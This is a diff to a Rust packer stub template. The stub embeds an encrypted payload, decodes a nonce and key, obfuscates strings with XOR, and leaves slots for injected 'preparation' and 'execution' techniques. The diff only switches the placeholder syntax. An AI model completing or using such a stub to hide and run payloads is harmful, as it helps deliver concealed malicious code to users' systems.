@@ -12,12 +12,12 @@ use windows::core::PCSTR;
 use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE};
 
 // --- Injected constants (packer) ---
-const NONCE_HEX: &str = "{{NONCE_HEX}}";
-const KEY_HEX: &str = "{{KEY_HEX}}";
-const PLAINTEXT_LEN: usize = {{PLAINTEXT_LEN}};
+const NONCE_HEX: &str = "$NONCE_HEX$";
+const KEY_HEX: &str = "$KEY_HEX$";
+const PLAINTEXT_LEN: usize = $PLAINTEXT_LEN$;
 
 /// Encrypted payload embedded at compile time.
-const PAYLOAD_ENC: &[u8] = include_bytes!("{{PAYLOAD_PATH}}");
+const PAYLOAD_ENC: &[u8] = include_bytes!("$PAYLOAD_PATH$");
 
 // --- String obfuscation helpers (used by the injected string defs) ---
 // `dec_xor` reconstructs the XOR-obfuscated literals. It is dead code (and
@@ -43,7 +43,7 @@ fn main() {
 }
 
 fn run() -> Result<i32, String> {
-    let stub_marker = {{STUB_MARKER_DEF}};
+    let stub_marker = $STUB_MARKER_DEF$;
 
     // 1. Decode nonce and key from hex.
     let nonce_vec = hex::decode(NONCE_HEX).map_err(|e| format!("invalid nonce: {e}"))?;
@@ -94,7 +94,7 @@ fn show_message_box(text: &str, title: &str) {
 }
 
 // --- Preparation techniques (injected in pipeline order) ---
-{{PREPARATION_BLOCKS}}
+$PREPARATION_BLOCKS$
 
 // --- Execution technique (injected) ---
-{{EXECUTION_BLOCK}}
+$EXECUTION_BLOCK$
